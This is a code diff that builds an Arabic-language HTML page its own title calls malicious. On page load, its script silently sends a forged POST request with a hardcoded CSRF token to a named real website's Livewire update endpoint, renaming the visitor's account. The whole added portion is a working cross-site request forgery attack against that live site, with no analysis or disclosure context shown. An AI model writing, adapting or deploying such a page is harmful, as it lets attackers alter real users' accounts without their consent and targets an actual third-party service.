@@ -1,11 +1,41 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Hacker Page</title>
-  </head>
-  <body>
-      <h1>Hack Page</h1>
-      
-      <script></script>
-  </body>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة ضارة لتغيير اسم المستخدم</title>
+    <script>
+        // وظيفة لجعل الطلب لتغيير اسم المستخدم
+        function changeUsername() {
+            // إعداد البيانات المطلوبة لتغيير اسم المستخدم
+            const data = {
+                name: "كاف" // الاسم الجديد المراد تغييره
+            };
+
+            // تنفيذ الطلب لتغيير اسم المستخدم
+            fetch("https://www.aseeralkotb.com/ar/livewire/update", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-CSRF-TOKEN": "SqBNL4cxq2qMJukG0wIv6qm4dakRwlSKFt2HUjaz" // استبدل بالتوكن الصحيح إذا لزم الأمر
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم تغيير اسم المستخدم إلى 'كاف' بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء تغيير اسم المستخدم.");
+                }
+            });
+        }
+
+        // استدعاء دالة تغيير اسم المستخدم عند تحميل الصفحة
+        window.onload = changeUsername;
+    </script>
+</head>
+<body>
+    <h1>مرحبًا بك في الصفحة الضارة</h1>
+    <p>سيتم تغيير اسم المستخدم الخاص بك إلى "كاف" عند تحميل الصفحة.</p>
+</body>
 </html>
